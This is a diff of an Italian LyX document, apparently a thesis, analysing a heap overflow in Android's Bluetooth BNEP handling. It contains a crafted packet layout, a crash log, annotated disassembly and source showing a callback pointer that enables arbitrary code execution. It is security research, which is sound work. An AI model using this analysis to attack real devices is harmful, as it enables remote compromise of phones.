+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{8}{
+\backslash
+texttt{0x41}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{8}{
+\backslash
+texttt{0x41}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{bytefield}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Plain Layout
+\begin_inset Caption Standard
+
+\begin_layout Plain Layout
+\begin_inset CommandInset label
+LatexCommand label
+name "fig:bnep-vulnerable-function-sample-packet-format"
+
+\end_inset
+
+Formato di un pacchetto BNEP di esempio in grado di eseguire heap overflow
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Dopo aver inviato 
+\begin_inset Formula $500\text{-}1000$
+\end_inset
+
+ di questi pacchetti (impiegando poco più di 
+\begin_inset Formula $1$
+\end_inset
+
+ secondo) il demone bluetooth del dispositivo vittima si interrompe.
+ Il 
+\emph on
+crash
+\emph default
+ è visibile sia sul dispositivo stesso (vedi Fig.
+ 
 \begin_inset Note Note
 status open
 
 \begin_layout Plain Layout
-TODO
+TODO: inserisci screenshot crash bluetooth
+\end_layout
+
+\end_inset
+
+) che andando ad analizzare i 
+\emph on
+log
+\emph default
+ dove vediamo chiaramente che il demone ha cercato di all'indirizzo indicato
+ nel nostro pacchetto (
+\begin_inset Formula $0\text{x}41414141$
+\end_inset
+
+).
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+pid: 6774, tid: 6812, name: bluetooth wake  >>> com.android.bluetooth <<<
+\end_layout
+
+\begin_layout Plain Layout
+
+signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x41414141
+\end_layout
+
+\begin_layout Plain Layout
+
+	r0 41414141  r1 00000000  r2 5b7ad2ec  r3 00000008
+\end_layout
+
+\begin_layout Plain Layout
+
+	r4 41414141  r5 00000001  r6 e94145b8  r7 d61008d8
+\end_layout
+
+\begin_layout Plain Layout
+
+	r8 00000000  r9 d61004b0  sl e693ef20  fp e94145c4
+\end_layout
+
+\begin_layout Plain Layout
+
+	ip d61008d8  sp d61004a0  lr f08bb421  pc ef1df8ec  cpsr 000f0030
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+backtrace:
+\end_layout
+
+\begin_layout Plain Layout
+
+	#00 pc 000d38ec  /system/lib/hw/bluetooth.default.so
+\end_layout
+
+\begin_layout Plain Layout
+
+	#01 pc 000e79a5  /system/lib/hw/bluetooth.default.so
+\end_layout
+
+\begin_layout Plain Layout
+
+	#02 pc 000e876b  /system/lib/hw/bluetooth.default.so
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Andando ad analizzare il codice assembly della funzione che ha presentato
+ il 
+\emph on
+crash
+\emph default
+ indicato nel 
+\emph on
+backtrace
+\emph default
+ otteniamo il seguente estratto:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+0x000d38ea		mov r4, r0			; r4 = r0
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d38ec		ldrh r1, [r4]		; r1 = (uint16)(*r4)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d38ee		bic r0, r1, 0xff	; r0 = r1 & 0xFF
+\end_layout
+
+\begin_layout Plain Layout
+
+...									; ...
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d38f2		cmp.w r0, 0x1600	; if (r0 >= 0x1600)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d38f6		bge 0xd3914			; 	fn_d3914(r4)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d38f8		cmp.w r0, 0x1000	; else if (r0 == 0x1000)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d38fc		beq 0xd392e			; 	fn_d392e(r4)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d38fe		cmp.w r0, 0x1100	; else if (r0 == 0x1100)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d3902		beq 0xd3958			; 	fn_d3958(r4)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d3904		cmp.w r0, 0x1200	; else if (r0 != 0x1200)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d3908		bne 0xd3978			; 	fn_d3978(r4)
+\end_layout
+
+\begin_layout Plain Layout
+
+...									; ...
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d3916		cmp.w r0, 0x1900	; else if (r0 == 0x1900)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d391a		beq 0xd396e			; 	fn_d396e(r4)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d391c		cmp.w r0, 0x1700	; else if (r0 == 0x1700) {
+\end_layout
+
+\begin_layout Plain Layout
+
+...									; ...
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d3922		ldr r1, [r4, 8]		; 	r1 = *(r4 + 8)
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d3924		mov r0, r4			; 	r0 = r4
+\end_layout
+
+\begin_layout Plain Layout
+
+0x000d3926		blx r1				; 	fn_r1(r0)
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Sapendo che 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+r4
+\end_layout
+
+\end_inset
+
+
+\size default
+ è una copia del parametro 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+r0
+\end_layout
+
+\end_inset
+
+
+\size default
+ passato alla funzione, e sapendo che il 
+\emph on
+crash
+\emph default
+ avviene durante l'operazione di dereferenziazione di 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+r4
+\end_layout
+
+\end_inset
+
+
+\size default
+, sappiamo che questo è un puntatore.
+\end_layout
+
+\begin_layout Standard
+Analizzando anche la restante parte del codice possiamo capire che si tratta
+ di un puntatore a una struttura che si presenta all'incirca nel modo seguente:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=C,tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+typedef struct {
+\end_layout
+
+\begin_layout Plain Layout
+
+	uint16_t <parametro>;
+\end_layout
+
+\begin_layout Plain Layout
+
+	// 6 byte di parametri
+\end_layout
+
+\begin_layout Plain Layout
+
+	(void)(*)(<struttura>) <puntatore a funzione>;
+\end_layout
+
+\begin_layout Plain Layout
+
+	// eventuali altri parametri
+\end_layout
+
+\begin_layout Plain Layout
+
+} <struttura>;
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Il primo parametro della struttura viene utilizzato nella catena di 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+if/else
+\end_layout
+
+\end_inset
+
+
+\size default
+, ma quello che è più interessante è il caso 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+r0 == 0x1700
+\end_layout
+
+\end_inset
+
+
+\size default
+ in cui viene invocata una funzione il cui puntatore è all'offset 
+\begin_inset Formula $8$
+\end_inset
+
+ all'interno della struttura e il parametro della funzione è la struttura
+ stessa, condizione ideale per permettere esecuzione di codice arbitrario.
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Attraverso ulteriori indagini siamo in grado di identificare nel codice
+ sorgente la funzione corrispondente all'estratto appena analizzato.
+ La funzione in questione si trova in 
+\begin_inset CommandInset href
+LatexCommand href
+name "/stack/btu/btu_task.c"
+target "https://android.googlesource.com/platform/system/bt/+/android-7.1.1_r44/stack/btu/btu_task.c#117"
+
+\end_inset
+
+ ed è
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+static void btu_hci_msg_process(BT_HDR *p_msg);
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+la cui implementazione è la seguente
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+/* Determine the input message type.
+ */
+\end_layout
+
+\begin_layout Plain Layout
+
+switch (p_msg->event & BT_EVT_MASK)
+\end_layout
+
+\begin_layout Plain Layout
+
+{
+\end_layout
+
+\begin_layout Plain Layout
+
+	case BTU_POST_TO_TASK_NO_GOOD_HORRIBLE_HACK:
+\end_layout
+
+\begin_layout Plain Layout
+
+		((post_to_task_hack_t *)(&p_msg->data[0]))->callback(p_msg);
+\end_layout
+
+\begin_layout Plain Layout
+
+		...
+\end_layout
+
+\begin_layout Plain Layout
+
+		break;
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	case BT_EVT_TO_BTU_HCI_ACL:
+\end_layout
+
+\begin_layout Plain Layout
+
+		l2c_rcv_acl_data (p_msg);
+\end_layout
+
+\begin_layout Plain Layout
+
+		break;
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\end_layout
+
+\begin_layout Plain Layout
+
+	case BT_EVT_TO_BTU_L2C_SEG_XMIT:
+\end_layout
+
+\begin_layout Plain Layout
+
+		l2c_link_segments_xmitted (p_msg);
+\end_layout
+
+\begin_layout Plain Layout
+
+		break;
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	...
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Il 
+\emph on
+crash
+\emph default
+ del demone Bluetooth avviene durante l'esecuzione della dereferenziazione
+ 
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+p_msg->event
+\end_layout
+
+\end_inset
+
+ (equivalente a 
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+r1 = (*r4)
+\end_layout
+
+\end_inset
+
+) in quanto, lo ripetiamo, dopo l'heap overflow il puntatore alla struttura
+ 
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+p_msg
+\end_layout
+
+\end_inset
+
+ è uguale all'indirizzo 
+\begin_inset Formula $0\text{x}41414141$
+\end_inset
+
+.
+\end_layout
+
+\begin_layout Standard
+L'evento per cui 
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+r0 == 0x1700
+\end_layout
+
+\end_inset
+
+ si verifica quando 
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+(p_msg->event && BT_EVT_MASK) == BTU_POST_TO_TASK_NO_GOOD_HORRIBLE_HACK
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Se questa condizione è vera viene eseguito
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+((post_to_task_hack_t *)(&p_msg->data[0]))->callback(p_msg);
 \end_layout
 
 \end_inset
